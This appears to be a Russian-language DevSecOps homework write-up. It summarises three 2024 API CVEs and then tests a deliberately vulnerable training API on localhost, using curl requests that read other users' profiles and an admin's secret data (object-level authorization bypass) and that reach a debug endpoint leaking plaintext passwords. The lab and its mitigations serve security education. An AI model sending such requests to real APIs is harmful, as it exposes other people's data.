# Часть I — CVE за последний год

Нашёл три CVE за 2024 год, которые относятся к уязвимостям из OWASP API Security Top 10.

---

### CVE-2024-41730 — SAP BusinessObjects Business Intelligence Platform

**Тип:** API2:2023 — Broken Authentication  
**CVSS:** 9.8 (критический)  
**Дата:** август 2024

В платформе SAP BusinessObjects при включённом Single Sign-On был открыт REST-эндпоинт `/biprws/logon/trusted`. Любой желающий мог отправить на него запрос без каких-либо учётных данных и получить в ответ валидный токен сессии. С этим токеном можно было получить полный доступ к системе.

Проблема в том, что разработчики не добавили проверку подлинности на этот эндпоинт видимо, рассчитывали что он будет доступен только из внутренней сети. Технической защиты не было никакой, поэтому атака просто один HTTP запрос без пароля.

Исправление: SAP выпустил патч, закрывающий эндпоинт. Временное решение отключить Enterprise SSO или закрыть доступ к REST API на уровне сети.

---

### CVE-2024-46528 — KubeSphere

**Тип:** API1:2023 — Broken Object Level Authorization (BOLA)  
**CVSS:** 6.5 (средний)  
**Дата:** октябрь 2024

KubeSphere — это платформа для управления Kubernetes-кластерами. В версиях 3.4.1 и 4.1.1 обнаружили, что пользователь с минимальными правами может через API читать данные всего кластера: список узлов, список пользователей, данные мониторинга. По документации такой пользователь вообще не должен видеть ничего до вступления в рабочее пространство.

Причина это глобальная роль `authenticated`, которая назначается всем вошедшим пользователям, содержала лишние разрешения. API не проверял, имеет ли конкретный пользователь право на конкретный объект кластера.

Исправление: обновление до версии 4.1.3+, либо вручную убрать лишние права из роли `authenticated` через kubectl.

---

### CVE-2024-41110 — Docker Engine

**Тип:** API5:2023 — Broken Function Level Authorization (BFLA)  
**CVSS:** 9.9 (критический)  
**Дата:** июль 2024

Docker поддерживает плагины авторизации (AuthZ plugins) они проверяют каждый запрос к Docker API и решают, разрешить его или нет. Оказалось, что если отправить запрос с заголовком `Content-Length: 0`, демон Docker пересылал этот запрос в плагин без тела. Плагин не видел содержимого запроса и давал разрешение, хотя при полном запросе отказал бы.

Таким образом можно было выполнять привилегированные операции через Docker API, создавать контейнеры с особыми правами, монтировать хостовые директории то есть фактически получить root на хосте.

Уязвимость была исправлена ещё в 2019 году, но исправление не перенесли в следующие версии (19.03 и выше) — это ошибка регрессии.

Исправление: обновление Docker Engine до версии 27.1.1+.

# Часть II — Поиск уязвимости в приложении ket9/otus-devsecops-owasp-rest

---

## 1. Ход рассуждений

Запустил образ командами из задания:

```
docker pull ket9/otus-devsecops-owasp-rest
docker run -d -p 8080:8080 ket9/otus-devsecops-owasp-rest:latest
```

Открыл `http://localhost:8080` — приложение отдало JSON со списком доступных эндпоинтов. Из него стало понятно что это API-сервис с пользователями и книгами. Перешёл на `http://localhost:8080/createdb` — база наполнилась тестовыми данными.

Первым делом решил посмотреть что вообще есть в приложении. Заметил в списке эндпоинтов путь `/users/v1/_debug` с пометкой "debug". Открыл его в браузере без какой-либо авторизации и получил:

```json
{
  "users": [
    {"admin": false, "email": "mail1@mail.com", "password": "pass1", "username": "name1"},
    {"admin": false, "email": "mail2@mail.com", "password": "pass2", "username": "name2"},
    {"admin": true,  "email": "admin@mail.com", "password": "pass1", "username": "admin"}
  ]
}
```

Отладочный эндпоинт отдал всех пользователей с паролями в открытом виде без какого-либо токена. Но решил копать дальше и проверить основные эндпоинты.

Зарегистрировал тестового пользователя:

```
curl -s -X POST http://localhost:8080/users/v1/register \
  -H "Content-Type: application/json" \
  -d '{"username": "attacker", "password": "Test1234!", "email": "attacker@test.com"}'
```

Ответ: `{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}`

Залогинился и получил токен:

```
curl -s -X POST http://localhost:8080/users/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username": "attacker", "password": "Test1234!"}'
```

Ответ:
```json
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...", "message": "Successfully logged in.", "status": "success"}
```

Теперь есть токен обычного пользователя. Попробовал с ним запросить профиль администратора — просто подставил `admin` в URL:

```
curl -s -X GET http://localhost:8080/users/v1/admin \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
```

Ответ: `{"username": "admin", "email": "admin@mail.com"}`

Ожидал получить 403 Forbidden, но сервер вернул данные администратора. Проверил то же самое с другим пользователем:

```
curl -s -X GET http://localhost:8080/users/v1/name1 \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
```

Ответ: `{"username": "name1", "email": "mail1@mail.com"}`

Та же история. Сервер не проверяет, запрашиваешь ли свои данные или чужие.

Пошёл дальше — посмотрел книги:

```
curl -s -X GET http://localhost:8080/books/v1 \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
```

Ответ:
```json
{"Books": [
  {"book_title": "bookTitle40", "user": "name1"},
  {"book_title": "bookTitle47", "user": "name2"},
  {"book_title": "bookTitle50", "user": "admin"}
]}
```

Видны книги всех пользователей сразу. Попробовал прочитать книгу администратора:

```
curl -s -X GET http://localhost:8080/books/v1/bookTitle50 \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
```

Ответ:
```json
{"book_title": "bookTitle50", "owner": "admin", "secret": "secret for bookTitle50"}
```

Получил секретное поле книги администратора, находясь под аккаунтом `attacker`. Приложение не проверяет принадлежность объекта пользователю ни для профилей, ни для книг.

---

## 2. Описание найденной уязвимости

В приложении отсутствует проверка прав доступа на уровне объектов. Любой авторизованный пользователь может получить данные другого пользователя или его ресурсы, просто указав нужный идентификатор в URL.

Уязвимые эндпоинты:
- `GET /users/v1/{username}` — возвращает профиль любого пользователя по имени
- `GET /books/v1/{book}` — возвращает содержимое любой книги включая секретные поля
- `GET /users/v1/_debug` — возвращает всех пользователей с паролями без авторизации

Сервер проверяет только факт авторизации (есть ли токен), но не проверяет имеет ли пользователь право на доступ к конкретному объекту.

---

## 3. Тип уязвимости

**API1:2023 — Broken Object Level Authorization (BOLA)**

Первая позиция в OWASP API Security Top 10 (2023). API принимает идентификатор объекта от клиента и возвращает данные без проверки — принадлежит ли объект запрашивающему пользователю.

Дополнительно присутствует **API8:2023 — Security Misconfiguration**: отладочный эндпоинт `/debug` открыт в рабочем приложении и не требует никакой авторизации.

---

## 4. Меры предотвращения

1. **Проверять владельца объекта при каждом запросе.** Перед возвратом данных сервер должен сравнивать запрошенный идентификатор с идентификатором пользователя из токена. Если не совпадает тогда возвращать 403 Forbidden.

2. **Закрыть debug-эндпоинты в продакшне.** Эндпоинт `/users/v1/_debug` не должен быть доступен вообще, либо требовать отдельной административной авторизации.

3. **Не хранить пароли в открытом виде.** Пароли должны храниться в виде хэшей (bcrypt, argon2), а не как простой текст.

4. **Фильтровать данные по текущему пользователю.** Эндпоинт списка книг возвращает книги всех пользователей, нужно отдавать только книги того, кто делает запрос.
